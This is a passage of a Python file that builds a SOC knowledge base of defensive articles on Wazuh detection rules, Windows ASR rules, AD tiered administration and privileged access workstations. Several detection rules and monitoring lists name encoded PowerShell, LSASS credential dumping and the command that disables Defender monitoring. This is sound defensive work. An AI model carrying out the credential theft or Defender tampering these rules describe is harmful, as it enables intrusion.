    <rules_id>5712</rules_id>
    <timeout>600</timeout>
  </active-response>
</ossec_config>
```

## Rule Writing

### Rule Syntax

```xml
<!-- Wazuh rules use XML format -->
<!-- Rules are in /var/ossec/etc/rules/ (custom) or /var/ossec/ruleset/rules/ (built-in) -->

<group name="custom_rules,">
  <!-- Basic rule: match a log pattern -->
  <rule id="100001" level="10">
    <decoded_as>json</decoded_as>
    <field name="event.action">logon-failed</field>
    <description>Failed logon attempt detected</description>
    <group>authentication_failure,</group>
  </rule>

  <!-- Frequency-based rule: brute force detection -->
  <rule id="100002" level="12" frequency="10" timeframe="120">
    <if_matched_sid>100001</if_matched_sid>
    <same_source_ip/>
    <description>Brute force attack: 10+ failed logons in 2 minutes</description>
    <mitre>
      <id>T1110.001</id>
    </mitre>
    <group>authentication_failure,brute_force,</group>
  </rule>
</group>
```

### Rule Levels

| Level | Severity | Example |
|---|---|---|
| 0 | Ignored | Noise, no logging |
| 1-3 | Low | System notifications, status messages |
| 4-6 | Medium | Errors, invalid logins |
| 7-9 | High | Bad words in logs, first-time events |
| 10-12 | Critical | Multiple failures, integrity changes |
| 13-15 | Emergency | Attack patterns, rootkit detection |

### Custom Detection Rules

```xml
<!-- /var/ossec/etc/rules/local_rules.xml -->

<group name="soc_custom,">

  <!-- Detect PowerShell encoded commands -->
  <rule id="100010" level="12">
    <if_sid>61600</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)powershell.*(-enc|-encodedcommand)\s+[A-Za-z0-9+/=]{20,}</field>
    <description>Encoded PowerShell command execution detected</description>
    <mitre>
      <id>T1059.001</id>
      <id>T1027</id>
    </mitre>
    <group>attack,execution,</group>
  </rule>

  <!-- Detect new service creation via Sysmon -->
  <rule id="100011" level="10">
    <if_sid>61600</if_sid>
    <field name="win.system.eventID">7045</field>
    <field name="win.eventdata.serviceName" type="pcre2">(?i)^(?!Windows|Microsoft|Google|Adobe)</field>
    <description>New service installed: possible persistence</description>
    <mitre>
      <id>T1543.003</id>
    </mitre>
    <group>attack,persistence,</group>
  </rule>

  <!-- Detect LSASS access via Sysmon Event 10 -->
  <rule id="100012" level="14">
    <if_sid>61600</if_sid>
    <field name="win.system.eventID">10</field>
    <field name="win.eventdata.targetImage" type="pcre2">(?i)lsass\.exe$</field>
    <description>Suspicious LSASS access - possible credential dumping</description>
    <mitre><id>T1003.001</id></mitre>
    <group>attack,credential_access,</group>
  </rule>

</group>
```

### Testing Rules

```bash
# Test a rule against a log sample
/var/ossec/bin/wazuh-logtest

# Paste a sample log line and see which rules match
# Example input:
# Mar 15 14:23:45 webserver sshd[12345]: Failed password for root from 10.0.0.50 port 22 ssh2

# Output shows: decoded fields, matched rules, alert level
```

## Active Response

```xml
<!-- Block IP after brute force detection -->
<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5712</rules_id>
  <timeout>3600</timeout>
</active-response>
```

Active response can trigger firewall blocks, account disabling, or custom scripts
when specific rules fire. Always test in monitor-only mode before enabling blocking.

## Real Investigation Example

### Scenario: Detecting and Responding to Brute Force

```
1. DETECTION: Rule fires "SSH brute force from 10.0.0.50" (level 12, T1110.001)
2. AUTO-RESPONSE: firewall-drop blocks IP for 3600 seconds
3. INVESTIGATION: Dashboard shows 47 failed SSH attempts in 30 seconds
4. FOLLOW-UP: Check threat intel, add permanent block, harden SSH config
```

## Integration with SOC Workflow

### Wazuh API

```bash
# Get agent list
curl -k -X GET "https://localhost:55000/agents?pretty=true" \
  -H "Authorization: Bearer $TOKEN"

# Get alerts
curl -k -X GET "https://localhost:55000/alerts?pretty=true&limit=10" \
  -H "Authorization: Bearer $TOKEN"
```

Wazuh includes a built-in MITRE ATT&CK dashboard module for visualizing technique
coverage as a heat map and drilling into specific technique detections over time.

## Best Practices

1. **Start with default rules** and add custom rules for your environment
2. **Use rule testing** (wazuh-logtest) before deploying new rules
3. **Enable FIM** on critical system files and web application directories
4. **Configure active response carefully** - test in monitor mode first
5. **Integrate Sysmon** on Windows agents for deeper endpoint visibility
6. **Use CDB lists** for IOC matching (IP lists, hash lists, user lists)
7. **Monitor agent connectivity** - disconnected agents create blind spots
8. **Tune noisy rules** by adjusting levels or adding exclusions

## Further Reading

- Wazuh documentation: https://documentation.wazuh.com/
- Wazuh ruleset: https://github.com/wazuh/wazuh-ruleset
- Wazuh blog: https://wazuh.com/blog/
- OSSEC rule writing: https://www.ossec.net/docs/manual/rules-decoders/
"""
    ))

    return articles


def active_defense_articles():
    """Return 16 active defense and hardening articles for SOC analyst knowledge base."""

    articles = []

    # -------------------------------------------------------------------------
    # Article 1: Windows Attack Surface Reduction (ASR) Rules Configuration
    # -------------------------------------------------------------------------
    articles.append((
        "Windows Attack Surface Reduction (ASR) Rules Configuration",
        ["hardening", "asr", "windows", "defense", "endpoint", "microsoft-defender"],
        r"""# Windows Attack Surface Reduction (ASR) Rules Configuration

## Why This Matters

Attack Surface Reduction (ASR) rules are a component of Microsoft Defender for Endpoint that block behaviors commonly abused by malware and threat actors. ASR rules target specific software behaviors such as launching executable files and scripts that attempt to download or run files, running obfuscated scripts, and performing behaviors that apps do not usually initiate during normal work. Misconfigurations or lack of ASR deployment is a leading factor in successful endpoint compromise across enterprise environments.

**Key threat scenarios ASR mitigates:**

| Threat Scenario | ASR Rule Category | MITRE Technique |
|---|---|---|
| Macro-based malware delivery | Office rules | T1566.001 |
| Script-based execution | Script rules | T1059 |
| Credential theft from LSASS | Credential rules | T1003.001 |
| Ransomware file encryption | Ransomware rule | T1486 |
| Living-off-the-land binaries | Process rules | T1218 |

## Prerequisites

- Windows 10 version 1709+ or Windows 11
- Microsoft Defender Antivirus as the primary AV (not in passive mode)
- Cloud-delivered protection enabled
- For full feature set: Microsoft Defender for Endpoint Plan 2 or Microsoft 365 Defender

## ASR Rule Reference

Each rule has a GUID used for GPO/Intune/PowerShell configuration:

| Rule Name | GUID | Recommended Mode |
|---|---|---|
| Block abuse of exploited vulnerable signed drivers | 56a863a9-875e-4185-98a7-b882c64b5ce5 | Block |
| Block Adobe Reader from creating child processes | 7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c | Block |
| Block all Office applications from creating child processes | d4f940ab-401b-4efc-aadc-ad5f3c50688a | Block |
| Block credential stealing from Windows LSASS | 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 | Block |
| Block executable content from email client and webmail | be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 | Block |
| Block executable files unless they meet criteria | 01443614-cd74-433a-b99e-2ecdc07bfc25 | Audit first |
| Block execution of potentially obfuscated scripts | 5beb7efe-fd9a-4556-801d-275e5ffc04cc | Block |
| Block JavaScript or VBScript from launching downloads | d3e037e1-3eb8-44c8-a917-57927947596d | Block |
| Block Office apps from creating executable content | 3b576869-a4ec-4529-8536-b80a7769e899 | Block |
| Block Office apps from injecting code into processes | 75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84 | Block |
| Block persistence through WMI event subscription | e6db77e5-3df2-4cf1-b95a-636979351e5b | Block |
| Block process creations from PSExec and WMI | d1e49aac-8f56-4280-b9ba-993a6d77406c | Block |
| Block untrusted/unsigned processes from USB | b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4 | Block |
| Block Win32 API calls from Office macros | 92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b | Block |
| Use advanced protection against ransomware | c1db55ab-c21a-4637-bb3f-a12568109d35 | Block |

## Implementation Steps

### Step 1: Audit Mode Deployment

Always start in Audit mode to identify potential business impact before blocking.

**Via Group Policy:**

```
Computer Configuration > Administrative Templates > Windows Components >
  Microsoft Defender Antivirus > Microsoft Defender Exploit Guard >
    Attack Surface Reduction

Setting: Configure Attack Surface Reduction rules = Enabled
```

Set each rule GUID to value `2` (Audit):

```
d4f940ab-401b-4efc-aadc-ad5f3c50688a = 2
3b576869-a4ec-4529-8536-b80a7769e899 = 2
75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84 = 2
9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 = 2
```

**Via PowerShell (per-machine):**

```powershell
# Set all recommended rules to Audit mode (value 2)
$rules = @(
    "d4f940ab-401b-4efc-aadc-ad5f3c50688a",
    "3b576869-a4ec-4529-8536-b80a7769e899",
    "75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84",
    "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2",
    "be9ba2d9-53ea-4cdc-84e5-9b1eeee46550",
    "5beb7efe-fd9a-4556-801d-275e5ffc04cc",
    "d3e037e1-3eb8-44c8-a917-57927947596d",
    "7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c",
    "e6db77e5-3df2-4cf1-b95a-636979351e5b",
    "d1e49aac-8f56-4280-b9ba-993a6d77406c",
    "b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4",
    "92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b",
    "c1db55ab-c21a-4637-bb3f-a12568109d35"
)

foreach ($rule in $rules) {
    Set-MpPreference -AttackSurfaceReductionRules_Ids $rule `
        -AttackSurfaceReductionRules_Actions 2
}
```

### Step 2: Monitor Audit Events

ASR audit events appear in Windows Event Log:

```
Event Log: Microsoft-Windows-Windows Defender/Operational
Event IDs:
  1121 = ASR rule fired in Block mode
  1122 = ASR rule fired in Audit mode
```

**KQL query for Microsoft Sentinel / Defender:**

```kql
DeviceEvents
| where ActionType startswith "Asr"
| summarize Count=count() by ActionType, FileName, FolderPath
| sort by Count desc
```

**PowerShell to check recent ASR events:**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
    Where-Object { $_.Id -in @(1121, 1122) } |
    Select-Object TimeCreated, Id, Message -First 50
```

### Step 3: Configure Exclusions

For legitimate business applications that trigger false positives:

```powershell
# Add per-rule exclusion (file path)
Add-MpPreference -AttackSurfaceReductionOnlyExclusions "C:\AppDir\LegitApp.exe"
```

**GPO exclusion path:**

```
Computer Configuration > Administrative Templates > Windows Components >
  Microsoft Defender Antivirus > Microsoft Defender Exploit Guard >
    Attack Surface Reduction > Exclude files and paths
```

### Step 4: Switch to Block Mode

After 2-4 weeks of audit with no critical false positives, switch rules to Block (value `1`):

```powershell
foreach ($rule in $rules) {
    Set-MpPreference -AttackSurfaceReductionRules_Ids $rule `
        -AttackSurfaceReductionRules_Actions 1
}
```

## Verification Commands

```powershell
# Verify current ASR rule states
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions

# Quick status check
(Get-MpComputerStatus).AMRunningMode

# Test ASR with EICAR-like test (download MS ASR test tool)
# https://demo.wd.microsoft.com/Page/ASR2
```

## Monitoring for Bypass

Attackers may attempt to bypass ASR by:

1. **Disabling Defender** - Monitor for `Set-MpPreference -DisableRealtimeMonitoring $true`
2. **Tampering with ASR rules** - Alert on Event ID 5007 (Defender config changed)
3. **Using exclusion paths** - Audit exclusion list changes regularly
4. **DLL side-loading** - ASR does not cover all side-load scenarios; pair with WDAC

**Detection query for ASR tampering:**

```kql
DeviceRegistryEvents
| where RegistryKey has "Windows Defender" and RegistryKey has "Attack Surface Reduction"
| where ActionType == "RegistryValueSet"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
```

## MITRE ATT&CK References

| Technique | ID | ASR Coverage |
|---|---|---|
| Phishing: Spearphishing Attachment | T1566.001 | Email executable block, Office child process block |
| Command and Scripting Interpreter | T1059 | Obfuscated script block, JS/VBS download block |
| OS Credential Dumping: LSASS | T1003.001 | LSASS credential stealing block |
| Data Encrypted for Impact | T1486 | Advanced ransomware protection |
| Signed Binary Proxy Execution | T1218 | PSExec/WMI process creation block |
| Event Triggered Execution: WMI | T1546.003 | WMI persistence block |

## Rollout Checklist

- [ ] Confirm Defender is primary AV and cloud protection is enabled
- [ ] Deploy all rules in Audit mode via GPO or Intune
- [ ] Monitor audit events for 2-4 weeks
- [ ] Document and configure exclusions for false positives
- [ ] Switch to Block mode in phased rollout (pilot group first)
- [ ] Set up SIEM alerting for Event IDs 1121, 1122, and 5007
- [ ] Schedule quarterly exclusion review
"""
    ))

    # -------------------------------------------------------------------------
    # Article 2: Active Directory Tiered Administration Model
    # -------------------------------------------------------------------------
    articles.append((
        "Active Directory Tiered Administration Model",
        ["active-directory", "hardening", "tiered-admin", "defense", "identity", "lateral-movement"],
        r"""# Active Directory Tiered Administration Model

## Why This Matters

The tiered administration model (also called the Enhanced Security Administrative Environment or ESAE) is Microsoft's recommended approach for protecting Active Directory against credential theft and lateral movement. Without tiering, a single compromised admin workstation can lead to full domain compromise because the same credentials are used across workstations, servers, and domain controllers. Over 90% of enterprise AD compromises involve credential reuse across tiers.

**The core principle:** Administrative credentials for higher tiers must never be exposed to lower tiers.

| Tier | Assets | Examples |
|---|---|---|
| Tier 0 | Identity infrastructure | Domain Controllers, AD CS, AAD Connect, ADFS |
| Tier 1 | Enterprise servers and apps | SQL servers, Exchange, file servers, SCCM |
| Tier 2 | Workstations and devices | End-user PCs, printers, mobile devices |

**Attack scenario without tiering:**

```
Attacker compromises Tier 2 workstation
  -> Finds cached Tier 0 Domain Admin credentials
  -> Laterally moves to Domain Controller
  -> Full domain compromise in minutes
```

## Implementation Steps

### Step 1: Create Tier OU Structure

```powershell
# Create base OU structure for tiered administration
$domain = (Get-ADDomain).DistinguishedName

$ous = @(
    "OU=Tier 0,OU=Admin,$domain",
    "OU=Tier 1,OU=Admin,$domain",
    "OU=Tier 2,OU=Admin,$domain",
    "OU=Accounts,OU=Tier 0,OU=Admin,$domain",
    "OU=Groups,OU=Tier 0,OU=Admin,$domain",
    "OU=Devices,OU=Tier 0,OU=Admin,$domain",
    "OU=Accounts,OU=Tier 1,OU=Admin,$domain",
    "OU=Groups,OU=Tier 1,OU=Admin,$domain",
    "OU=Devices,OU=Tier 1,OU=Admin,$domain",
    "OU=Accounts,OU=Tier 2,OU=Admin,$domain",
    "OU=Groups,OU=Tier 2,OU=Admin,$domain",
    "OU=Devices,OU=Tier 2,OU=Admin,$domain"
)

# First create parent
New-ADOrganizationalUnit -Name "Admin" -Path $domain

foreach ($ou in $ous) {
    $name = ($ou -split ',')[0] -replace 'OU=',''
    $parent = ($ou -split ',',2)[1]
    New-ADOrganizationalUnit -Name $name -Path $parent
}
```

### Step 2: Create Tiered Admin Accounts

Each administrator gets a separate account per tier they manage:

```powershell
# Naming convention: t0-username, t1-username, t2-username
# Tier 0 admin account
New-ADUser -Name "T0-JSmith" -SamAccountName "t0-jsmith" `
    -Path "OU=Accounts,OU=Tier 0,OU=Admin,$domain" `
    -UserPrincipalName "t0-jsmith@contoso.com" `
    -AccountPassword (ConvertTo-SecureString "InitialP@ss!" -AsPlainText -Force) `
    -ChangePasswordAtLogon $true -Enabled $true

# Tier 1 admin account
New-ADUser -Name "T1-JSmith" -SamAccountName "t1-jsmith" `
    -Path "OU=Accounts,OU=Tier 1,OU=Admin,$domain" `
    -UserPrincipalName "t1-jsmith@contoso.com" `
    -AccountPassword (ConvertTo-SecureString "InitialP@ss!" -AsPlainText -Force) `
    -ChangePasswordAtLogon $true -Enabled $true
```

### Step 3: Create Tiered Admin Groups

```powershell
# Tier 0 groups
New-ADGroup -Name "Tier0-Admins" -GroupScope Global `
    -Path "OU=Groups,OU=Tier 0,OU=Admin,$domain"
New-ADGroup -Name "Tier0-DCAdmins" -GroupScope Global `
    -Path "OU=Groups,OU=Tier 0,OU=Admin,$domain"

# Tier 1 groups
New-ADGroup -Name "Tier1-ServerAdmins" -GroupScope Global `
    -Path "OU=Groups,OU=Tier 1,OU=Admin,$domain"
New-ADGroup -Name "Tier1-SQLAdmins" -GroupScope Global `
    -Path "OU=Groups,OU=Tier 1,OU=Admin,$domain"

# Tier 2 groups
New-ADGroup -Name "Tier2-WorkstationAdmins" -GroupScope Global `
    -Path "OU=Groups,OU=Tier 2,OU=Admin,$domain"
New-ADGroup -Name "Tier2-HelpDesk" -GroupScope Global `
    -Path "OU=Groups,OU=Tier 2,OU=Admin,$domain"
```

### Step 4: GPO Logon Restrictions

This is the critical control. Tier 0 accounts must only log on to Tier 0 devices.

**Tier 0 devices GPO - restrict who can log on:**

```
Computer Configuration > Policies > Windows Settings > Security Settings >
  Local Policies > User Rights Assignment

  Allow log on locally: Tier0-Admins
  Allow log on through Remote Desktop: Tier0-Admins
  Deny log on locally: Tier1-ServerAdmins, Tier2-WorkstationAdmins
  Deny log on through Remote Desktop: Tier1-ServerAdmins, Tier2-WorkstationAdmins
```

**Tier 1 and Tier 2 devices - deny Tier 0:**

```
Computer Configuration > Policies > Windows Settings > Security Settings >
  Local Policies > User Rights Assignment

  Deny log on locally: Domain Admins, Enterprise Admins, Tier0-Admins
  Deny log on through Remote Desktop: Domain Admins, Enterprise Admins, Tier0-Admins
  Deny access to this computer from the network: Domain Admins, Enterprise Admins
```

### Step 5: Authentication Policy Silos (Server 2012 R2+)

```powershell
# Create authentication policies
New-ADAuthenticationPolicy -Name "Tier0-Policy" `
    -UserTGTLifetimeMins 60 `
    -ComputerTGTLifetimeMins 60 `
    -Enforce

New-ADAuthenticationPolicy -Name "Tier1-Policy" `
    -UserTGTLifetimeMins 240 `
    -Enforce

# Create authentication policy silos
New-ADAuthenticationPolicySilo -Name "Tier0-Silo" `
    -UserAuthenticationPolicy "Tier0-Policy" `
    -ComputerAuthenticationPolicy "Tier0-Policy" `
    -Enforce

# Assign users and computers to silos
Set-ADUser "t0-jsmith" -AuthenticationPolicySilo "Tier0-Silo"
Set-ADComputer "DC01" -AuthenticationPolicySilo "Tier0-Silo"
```

## Verification Commands

```powershell
# Verify GPO is applied on a Tier 1 server
gpresult /r /scope computer | Select-String "Deny log on"

# Check authentication policy silo assignments
Get-ADUser "t0-jsmith" -Properties AuthenticationPolicySilo |
    Select-Object Name, AuthenticationPolicySilo

# Verify tiered group membership
Get-ADGroupMember "Tier0-Admins" | Select-Object Name, SamAccountName

# Test logon restriction (should fail if properly configured)
# Try RDP to a workstation with a Tier 0 account - should be denied

# Audit nested group memberships (dangerous paths)
Get-ADGroupMember "Domain Admins" -Recursive | Select-Object Name, ObjectClass
```

## Monitoring for Bypass

**Critical events to monitor:**

| Event ID | Source | Meaning |
|---|---|---|
| 4624 (Type 10) | Security | RDP logon - check for Tier 0 on lower tiers |
| 4624 (Type 3) | Security | Network logon - check for cross-tier |
| 4768 | Security | TGT request - monitor Tier 0 accounts |
| 4672 | Security | Special privileges assigned - track Tier 0 |

**Detection query for cross-tier logon violations:**

```kql
SecurityEvent
| where EventID == 4624
| where AccountType == "User"
| where Account has "t0-" or Account has "T0-"
| where Computer !has "DC" and Computer !has "PAW"
| project TimeGenerated, Account, Computer, LogonType, IpAddress
```

**Weekly audit script:**

```powershell
# Find Tier 0 accounts logging into non-Tier 0 systems
$t0Accounts = Get-ADGroupMember "Tier0-Admins" -Recursive |
    Select-Object -ExpandProperty SamAccountName

$events = Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=4624; StartTime=(Get-Date).AddDays(-7)
} | Where-Object {
    $msg = $_.Properties[5].Value
    $msg -in $t0Accounts
}
$events | Select-Object TimeCreated, @{N='Account';E={$_.Properties[5].Value}},
    @{N='Computer';E={$_.Properties[11].Value}}
```

## MITRE ATT&CK References

| Technique | ID | How Tiering Helps |
|---|---|---|
| OS Credential Dumping | T1003 | Tier 0 creds never on lower-tier machines |
| Pass the Hash | T1550.002 | Hash not present on compromised workstations |
| Lateral Movement | T1021 | Logon restrictions block cross-tier movement |
| Account Manipulation | T1098 | Separate accounts limit blast radius |
| Valid Accounts: Domain | T1078.002 | Siloed accounts constrain where they work |

## Rollout Checklist

- [ ] Document current admin account usage across all tiers
- [ ] Create OU structure and tiered groups
- [ ] Provision separate tiered accounts for all administrators
- [ ] Deploy logon restriction GPOs in audit mode first
- [ ] Configure authentication policy silos (2012 R2+ domains)
- [ ] Train admins on using the correct account per tier
- [ ] Monitor for cross-tier logon violations for 30 days
- [ ] Enforce GPO restrictions after validation period
- [ ] Quarterly review of tiered group memberships
"""
    ))

    # -------------------------------------------------------------------------
    # Article 3: Privileged Access Workstations (PAW) Implementation
    # -------------------------------------------------------------------------
    articles.append((
        "Privileged Access Workstations (PAW) Implementation",
        ["hardening", "paw", "privileged-access", "windows", "defense", "identity"],
        r"""# Privileged Access Workstations (PAW) Implementation

## Why This Matters

A Privileged Access Workstation (PAW) is a hardened workstation dedicated exclusively to performing sensitive administrative tasks. Standard admin practices where an administrator uses their daily workstation for both email/web browsing and domain administration create a direct attack path. If the workstation is compromised via phishing or drive-by download, the attacker immediately gains access to administrative credentials in memory. PAWs eliminate this risk by providing a clean, isolated environment for privileged operations.

**Risk without PAW:**

```
Phishing email -> Compromised daily workstation -> Admin opens ADUC
  -> Mimikatz dumps Domain Admin creds from memory -> Domain compromised
```

**Risk with PAW:**

```
Phishing email -> Compromised daily workstation -> No admin creds present
  -> Admin work done only on separate, hardened PAW -> Lateral movement blocked
```

| PAW Tier | Used For | Security Level |
|---|---|---|
| Tier 0 PAW | Domain Controllers, AD management, PKI | Highest |
| Tier 1 PAW | Server administration, SQL, Exchange | High |
| Tier 2 PAW | Workstation management, helpdesk | Moderate |

## Prerequisites

- Hardware: Dedicated physical machines or secured VMs (Hyper-V with Shielded VMs)
- OS: Windows 11 Enterprise (latest build)
- Networking: Separate VLAN for PAWs
- AD: Tiered administration model in place (see Tiered Admin article)

## Implementation Steps

### Step 1: Hardware and OS Baseline

```powershell
# Install Windows 11 Enterprise with Secure Boot + TPM 2.0
# During OOBE, join to domain and place in PAW OU
# Apply security baseline immediately

# Download and apply Microsoft Security Compliance Toolkit baselines
# https://www.microsoft.com/en-us/download/details.aspx?id=55319

# Import baseline GPO
Import-GPO -BackupGpoName "MSFT Windows 11 - Computer" `
    -Path "C:\SecurityBaselines\Windows11" `
    -TargetName "PAW-SecurityBaseline" -CreateIfNeeded
```

### Step 2: Network Isolation

PAWs should be on a dedicated VLAN with strict firewall rules:

```
# Firewall rules for PAW VLAN (example - Palo Alto syntax)
# Allow PAW -> Domain Controllers (LDAP, Kerberos, RPC)
allow PAW_VLAN -> DC_VLAN tcp/389,636,88,135,49152-65535
allow PAW_VLAN -> DC_VLAN udp/389,88,53

# Allow PAW -> Management targets per tier
allow PAW_T1_VLAN -> SERVER_VLAN tcp/3389,5985,5986

# DENY PAW -> Internet (all)
deny PAW_VLAN -> any tcp/80,443

# DENY PAW -> User workstation VLANs
deny PAW_VLAN -> WORKSTATION_VLAN any

# Allow limited updates via WSUS only
allow PAW_VLAN -> WSUS_SERVER tcp/8530,8531
```

### Step 3: GPO Hardening for PAWs

Create a dedicated GPO linked to the PAW OU:

**Software restrictions:**

```
Computer Configuration > Policies > Windows Settings > Security Settings >
  Software Restriction Policies

Default Security Level: Disallowed
Designated File Types: Remove LNK (to allow shortcuts)

Path Rules (allowed):
  %SystemRoot%\*         -> Unrestricted
  %ProgramFiles%\*       -> Unrestricted
  %ProgramFiles(x86)%\*  -> Unrestricted
  C:\AdminTools\*        -> Unrestricted (curated admin tools only)
```

**Disable unnecessary services:**

```powershell
# GPO or local configuration
$servicesToDisable = @(
    "Browser",          # Computer Browser
    "MapsBroker",       # Downloaded Maps Manager
    "lfsvc",            # Geolocation Service
    "SharedAccess",     # Internet Connection Sharing
    "lltdsvc",          # Link-Layer Topology Discovery Mapper
    "NetTcpPortSharing", # Net.Tcp Port Sharing
    "CscService",       # Offline Files
    "WerSvc",           # Windows Error Reporting
    "WMPNetworkSvc",    # Windows Media Player Network Sharing
    "XblAuthManager",   # Xbox Live Auth Manager
    "XblGameSave"       # Xbox Live Game Save
)

foreach ($svc in $servicesToDisable) {
    Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
}
```

**Remove unnecessary features:**

```powershell
# Remove consumer features
$features = @(
    "Microsoft.BingWeather",
    "Microsoft.GetHelp",
    "Microsoft.MicrosoftSolitaireCollection",
    "Microsoft.People",
    "Microsoft.WindowsMaps",
    "Microsoft.Xbox*",
    "Microsoft.ZuneMusic",
    "Microsoft.ZuneVideo"
)

foreach ($app in $features) {
    Get-AppxPackage -Name $app | Remove-AppxPackage -ErrorAction SilentlyContinue
    Get-AppxProvisionedPackage -Online |
        Where-Object { $_.PackageName -like "*$app*" } |
        Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue
}
```

### Step 4: Enable Advanced Security Features

```powershell
# Enable Credential Guard
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
    /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" `
    /v LsaCfgFlags /t REG_DWORD /d 1 /f

# Enable WDAC (Windows Defender Application Control)
# Use a custom WDAC policy for the PAW - allow only signed admin tools

# Enable Windows Firewall - block all inbound
Set-NetFirewallProfile -Profile Domain,Public,Private `
    -Enabled True -DefaultInboundAction Block `
    -DefaultOutboundAction Block -LogAllowed True -LogBlocked True

# Allow only required outbound
New-NetFirewallRule -DisplayName "Allow DNS" -Direction Outbound `
    -Protocol UDP -RemotePort 53 -Action Allow
New-NetFirewallRule -DisplayName "Allow Kerberos" -Direction Outbound `
    -Protocol TCP -RemotePort 88 -Action Allow
New-NetFirewallRule -DisplayName "Allow LDAP" -Direction Outbound `
    -Protocol TCP -RemotePort 389,636 -Action Allow
New-NetFirewallRule -DisplayName "Allow RDP Out" -Direction Outbound `
    -Protocol TCP -RemotePort 3389 -Action Allow
New-NetFirewallRule -DisplayName "Allow WinRM" -Direction Outbound `
    -Protocol TCP -RemotePort 5985,5986 -Action Allow
```

### Step 5: Local Admin and User Configuration

```powershell
# Only tiered admin accounts can log on
# GPO: Computer Configuration > User Rights Assignment
#   Allow log on locally: PAW-Tier0-Users (security group)
#   Deny log on locally: Domain Users

# Disable local admin account, use LAPS
Disable-LocalUser -Name "Administrator"

# Configure auto-lock: 5 minutes
# GPO: Computer > Policies > Windows Settings > Security Settings >
#   Local Policies > Security Options
#   Interactive logon: Machine inactivity limit = 300
```

## Verification Commands

```powershell
# Verify Credential Guard is running
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object VirtualizationBasedSecurityStatus

# Check firewall status
Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction

# Verify no internet access
Test-NetConnection -ComputerName "8.8.8.8" -Port 443 -WarningAction SilentlyContinue

# List installed applications (should be minimal)
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, Publisher | Sort-Object DisplayName

# Verify GPO application
gpresult /r /scope computer
```

## Monitoring for Bypass

| Indicator | Detection Method |
|---|---|
| USB device inserted | Event ID 6416 (PnP activity) |
| Unauthorized software execution | AppLocker/WDAC Event ID 8003, 8004 |
| Network connection to internet | Firewall log analysis |
| Login from non-admin account | Event ID 4624 correlation |
| Credential Guard disabled | Registry monitoring on DeviceGuard keys |

**Alerting query:**

```kql
DeviceEvents
| where DeviceName has "PAW"
| where ActionType in ("FirewallOutboundConnectionBlocked", "UsbDeviceConnected",
    "AppControlExecutionAudited")
| summarize Count=count() by ActionType, FileName, RemoteIP
| where Count > 5
```

## MITRE ATT&CK References

| Technique | ID | How PAW Mitigates |
|---|---|---|
| Phishing | T1566 | No email/browser on PAW |
| OS Credential Dumping | T1003 | Credential Guard blocks memory access |
| Exploitation for Client Execution | T1203 | Minimal software attack surface |
| Drive-by Compromise | T1189 | No internet access |
| Hardware Additions | T1200 | USB device restrictions |

## Rollout Checklist

- [ ] Procure dedicated hardware with TPM 2.0 and Secure Boot
- [ ] Build base image with Windows 11 Enterprise
- [ ] Create PAW OU and link hardening GPO
- [ ] Configure VLAN and firewall rules
- [ ] Enable Credential Guard and WDAC
- [ ] Install only required admin tools (RSAT, SQL SSMS, etc.)
- [ ] Test administrative workflows from PAW
- [ ] Deploy to Tier 0 admins first, then Tier 1
- [ ] Monitor PAW security events in SIEM
- [ ] Quarterly PAW image audit and rebuild
"""
    ))

    # -------------------------------------------------------------------------
    # Article 4: LAPS and gMSA for Credential Hygiene
    # -------------------------------------------------------------------------
    articles.append((
        "LAPS and gMSA for Credential Hygiene",
        ["hardening", "laps", "gmsa", "credentials", "active-directory", "defense"],
        r"""# LAPS and gMSA for Credential Hygiene

## Why This Matters

Shared local administrator passwords and static service account credentials are among the most exploited weaknesses in enterprise environments. When every workstation has the same local admin password, compromising one machine gives an attacker lateral movement to all machines. Similarly, service accounts with passwords that never change and have excessive privileges are prime targets for Kerberoasting and credential theft.

**Local Administrator Password Solution (LAPS)** automatically manages and rotates local admin passwords, storing them securely in Active Directory. **Group Managed Service Accounts (gMSA)** provide automatically managed, cryptographically strong passwords for service accounts that rotate every 30 days.

| Problem | Solution | Benefit |
|---|---|---|
| Same local admin password everywhere | LAPS | Unique password per machine, auto-rotated |
| Stale service account passwords | gMSA | 240-char password, auto-rotated every 30 days |
| Shared service account passwords | gMSA | Password managed by AD, no human knows it |
| Pass-the-hash with local admin | LAPS | Compromised hash only works on one machine |

## Implementation: Windows LAPS

### Step 1: Deploy Windows LAPS (Built into Windows 11 22H2+ and Server 2025)

For older systems, install the LAPS CSE (Client Side Extension):

```powershell
# Check if Windows LAPS is available (built-in)
Get-Command Get-LapsADPassword -ErrorAction SilentlyContinue

# For legacy LAPS, download MSI from Microsoft
# msiexec /i LAPS.x64.msi /quiet

# Update AD schema for Windows LAPS
Update-LapsADSchema

# Grant computers permission to update their own passwords
Set-LapsADComputerSelfPermission -Identity "OU=Workstations,DC=contoso,DC=com"
Set-LapsADComputerSelfPermission -Identity "OU=Servers,DC=contoso,DC=com"
```

### Step 2: Configure LAPS via GPO

